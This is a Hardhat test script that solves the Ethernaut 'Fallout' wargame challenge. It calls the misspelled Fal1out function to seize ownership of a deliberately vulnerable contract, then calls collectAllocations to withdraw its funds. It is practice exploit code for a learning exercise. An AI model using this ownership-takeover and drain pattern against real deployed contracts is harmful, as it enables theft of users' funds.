const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fallout Exploit using EOA", function () {
  let falloutContract,
    attacker,
    originalOwner,
    contractAddress,
    balance,
    newOwner;
  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x725699660449afA3B7AEE94cC110eF25E16C4aA9"; // insert contract INSTANCE address of ethernaut challenge
    falloutContract = await ethers.getContractAt("Fallout", contractAddress);

    console.log("grabing the fallout contract", falloutContract);

    let currentOwner = await falloutContract.owner();

    console.log("The current owner of the contract is", currentOwner);
  });

  it("perform exploit", async function () {
    // Attack flow
    // Call the fal1out function to become the new owner
    let txFallout = await falloutContract.Fal1out({
      value: ethers.utils.parseEther(".00001"),
    });

    let recipt = await txFallout.wait();
    console.log(txFallout);

    newOwner = await falloutContract.owner();

    let txCollectAllocation = await falloutContract.collectAllocations();
  });

  after("confirm exploit", async function () {
    expect(newOwner).to.be.eq(attacker.address);
  });
});
